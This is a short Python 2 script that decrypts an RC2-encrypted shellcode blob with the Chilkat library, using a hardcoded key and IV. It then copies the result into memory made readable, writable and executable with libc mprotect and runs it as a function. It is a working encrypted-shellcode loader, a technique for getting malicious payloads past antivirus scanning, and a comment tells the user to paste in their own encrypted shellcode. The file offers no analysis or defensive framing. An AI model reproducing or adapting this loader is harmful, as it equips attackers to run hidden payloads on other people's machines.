from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import chilkat

# Define RC2 parameters
crypt = chilkat.CkCrypt2()
success = crypt.UnlockComponent("Anything for 30-day trial")
if (success != True):
    print(crypt.lastErrorText())
    sys.exit()

crypt.put_CryptAlgorithm("rc2")                                                  # set the encryption algorithm to "rc2"
crypt.put_CipherMode("cbc")                                                      # set cipher mode to "cbc"
crypt.put_KeyLength(128)                                                         # set key length 128-bit
crypt.put_Rc2EffectiveKeyLength(128)                                             #  
crypt.put_PaddingScheme(0)                                                       # take care of padding
crypt.put_EncodingMode("hex")                                                    # set encoding mode to HEX
ivHex = "0001020304050607"                                                       # setup initialization vector for CBC mode.
crypt.SetEncodedIV(ivHex,"hex")                                                  # set encoding to HEX
keyHex = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F"      # set secret key 128-bit
crypt.SetEncodedKey(keyHex,"hex")

# decrypt shellcode, paste encrypted shellcode here
Encrypted_Shellcode = "F6F233BA271278F19E34812CC2B7ACD19385C2E7A6D477A4C72E71BF669540944E9E36B252321DB05BD96EE0223E5481"
Decrypted_Shellcode = crypt.decryptStringENC(Encrypted_Shellcode)                # decrypt shellcode

# execute decrypted shellcode
libc = CDLL('libc.so.6')
shellcode = Decrypted_Shellcode.decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()